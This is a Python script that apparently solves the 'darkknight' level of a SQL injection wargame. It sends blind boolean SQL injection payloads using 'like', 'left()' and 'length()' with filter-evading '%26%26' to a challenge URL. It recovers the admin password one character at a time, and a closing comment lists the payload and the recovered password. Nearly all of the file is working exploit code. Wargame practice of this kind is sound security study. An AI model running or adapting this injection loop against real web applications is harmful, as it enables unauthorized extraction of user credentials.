from hashlib import new
from requests import get

import string


url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie  = dict(PHPSESSID="lpaiqju1pvd389508vh94qhl4s")
sym = "!@#$%^&*()_-=+"
letters = string.digits + string.ascii_letters + sym
password = ""
length = 1


# get password length
while True:
    param = "?pw=test&no=1 || id like \"admin\" %26%26 length(pw) like " +str(length)
    new_url = url+param
    req = get(new_url, cookies=cookie)
    print("[length] " + str(length))
    if(req.text.find("Hello admin") > 0):
        print("Found password lenght= " + str(length))
        break
    length +=1

for i in range(1, length+1):
    print("[idx]: " + str(i))
    for x in letters:
        param = "?pw=test&no=1 || id like \"admin\" %26%26 left(pw,"+str(i)+") like \"" + str(password) + str(x)  + "\""
        print(param)
        new_url = url+param

        req = get(new_url, cookies=cookie)
        if(req.text.find("Hello admin") > 0):
            print("[Found] password char " + str(i) + " = " + str(x))
            password += str(x)
            break

print("Password: " + password)

"""

?pw=test&no=1 || id like "admin" %26%26 length(pw) like 1

password: 0b70ea1f

"""